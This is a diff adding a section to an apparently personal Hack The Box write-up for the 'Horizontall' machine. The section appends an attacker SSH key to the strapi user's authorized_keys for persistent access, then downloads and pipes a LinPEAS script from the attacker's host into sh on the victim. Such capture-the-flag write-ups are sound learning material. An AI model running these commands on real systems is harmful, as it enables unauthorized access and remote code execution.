@@ -153,3 +153,31 @@ Yay! To get system flag, we probably need to do something in `/home/developer/`.
 
 Because I am extremely lazy, and have basically no idea how to proceed, I'm going to cheat again :)
 
+### Cheating >:3c 
+
+So, apparently you can put the attacker's public key inside `/opt/strapi/.ssh/authorized_keys` to get a better shell. Because reverse shells often lack nice tty features.
+
+    echo "ssh-rsa whatever" >> /opt/strapi/.ssh/authorized_keys
+
+Attacker can now run:
+
+    ssh strapi@horizontall.htb /bin/bash
+
+The writeup recommends [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)...
+
+Let's do it!
+
+#### LinPEAS
+
+Note this is done this way because the HTB boxes lack internet access - I can't just `curl asdf | sh` after I get reverse shell.
+
+Attacker (build then host linpeas script):
+
+    pushd ~/Git
+    git clone 
+    python3 -m builder.linpeas_builder
+    python3 -m http.server
+
+Victim (dl and exec linpeas):
+
+    curl 10.10.14.64:8000/linpeas.sh | sh
